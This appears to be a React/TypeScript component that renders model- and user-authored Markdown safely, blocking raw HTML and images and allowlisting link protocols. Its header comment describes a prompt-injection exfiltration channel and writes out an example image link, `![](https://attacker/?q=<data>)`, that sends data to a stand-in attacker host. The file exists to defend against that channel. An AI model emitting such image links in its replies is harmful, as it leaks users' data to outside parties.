"use client";

import { useEffect, useRef, useState } from "react";
import ReactMarkdown, { defaultUrlTransform, type Components } from "react-markdown";
import remarkGfm from "remark-gfm";
import { Check, Copy } from "lucide-react";
import { Button } from "@/components/ui/button";
import { tr } from "@/lib/i18n/tr";
import { cn } from "@/lib/utils";

/**
 * Safe Markdown for model- and user-authored text (Phase 4 branch 3).
 *
 * Security contract (release-gate regression if broken):
 * - NO raw HTML: `skipHtml` drops every HTML node from the source, so a
 *   `<script>`, `<iframe>` or `<img onerror>` never reaches the DOM.
 * - NO images: `![](https://attacker/?q=<data>)` in a model reply is a
 *   known prompt-injection exfiltration channel -- rendering it would make
 *   the browser fetch the URL. Images are replaced by a text placeholder;
 *   no <img> element is ever created, so nothing is fetched.
 * - Links keep react-markdown's protocol allowlist (http/https/mailto/...;
 *   `javascript:`/`data:` become empty and render as plain text) and open
 *   in a new tab with `rel="noopener noreferrer"`.
 * - Fenced code gets a copy button; no syntax highlighting (Phase 4).
 */

function hastText(node: unknown): string {
  if (!node || typeof node !== "object") return "";
  const n = node as { type?: string; value?: string; children?: unknown[] };
  if (n.type === "text" && typeof n.value === "string") return n.value;
  return (n.children ?? []).map(hastText).join("");
}

/** Icon button copying `text` to the clipboard, with brief "Kopyalandı" feedback. */
export function CopyButton({
  text,
  label,
  className,
}: {
  text: string;
  label: string;
  className?: string;
}) {
  const [copied, setCopied] = useState(false);
  const timer = useRef<ReturnType<typeof setTimeout> | null>(null);
  useEffect(() => () => {
    if (timer.current) clearTimeout(timer.current);
  }, []);

  async function copy() {
    try {
      await navigator.clipboard.writeText(text);
      setCopied(true);
      if (timer.current) clearTimeout(timer.current);
      timer.current = setTimeout(() => setCopied(false), 1500);
    } catch {
      // Clipboard permission denied: nothing to report beyond no feedback.
    }
  }

  return (
    <Button
      type="button"
      variant="ghost"
      size="icon-xs"
      aria-label={copied ? tr.common.copied : label}
      title={copied ? tr.common.copied : label}
      onClick={() => void copy()}
      className={className}
    >
      {copied ? <Check /> : <Copy />}
    </Button>
  );
}

const COMPONENTS: Components = {
  img: ({ alt }) => (
    <span data-slot="markdown-image-omitted" className="text-muted-foreground italic">
      {tr.markdown.imageOmitted(alt ?? "")}
    </span>
  ),
  a: ({ href, children }) =>
    href ? (
      <a
        href={href}
        target="_blank"
        rel="noopener noreferrer"
        className="text-primary underline underline-offset-4"
      >
        {children}
      </a>
    ) : (
      <span>{children}</span>
    ),
  pre: ({ node, children }) => (
    <div className="relative">
      <CopyButton
        text={hastText(node).replace(/\n$/, "")}
        label={tr.common.copyCode}
        className="absolute top-1.5 right-1.5 bg-background/80"
      />
      <pre className="overflow-x-auto rounded-md border bg-muted p-3 pr-10 font-mono text-xs">
        {children}
      </pre>
    </div>
  ),
  code: ({ className, children }) => (
    <code className={cn("font-mono text-[0.85em]", className)}>{children}</code>
  ),
  p: ({ children }) => <p className="leading-relaxed">{children}</p>,
  ul: ({ children }) => <ul className="list-disc space-y-1 pl-5">{children}</ul>,
  ol: ({ children }) => <ol className="list-decimal space-y-1 pl-5">{children}</ol>,
  h1: ({ children }) => <h3 className="text-base font-semibold">{children}</h3>,
  h2: ({ children }) => <h4 className="text-base font-semibold">{children}</h4>,
  h3: ({ children }) => <h5 className="text-sm font-semibold">{children}</h5>,
  blockquote: ({ children }) => (
    <blockquote className="border-l-2 pl-3 text-muted-foreground">{children}</blockquote>
  ),
  table: ({ children }) => (
    <div className="overflow-x-auto">
      <table className="w-full border-collapse text-left text-xs">{children}</table>
    </div>
  ),
  th: ({ children }) => <th className="border px-2 py-1 font-medium">{children}</th>,
  td: ({ children }) => <td className="border px-2 py-1">{children}</td>,
};

export function Markdown({ children, className }: { children: string; className?: string }) {
  return (
    <div
      data-slot="markdown"
      className={cn(
        "flex flex-col gap-3 text-sm break-words [&_:not(pre)>code]:rounded [&_:not(pre)>code]:bg-muted [&_:not(pre)>code]:px-1 [&_:not(pre)>code]:py-0.5",
        className,
      )}
    >
      <ReactMarkdown
        remarkPlugins={[remarkGfm]}
        skipHtml
        urlTransform={defaultUrlTransform}
        components={COMPONENTS}
      >
        {children}
      </ReactMarkdown>
    </div>
  );
}
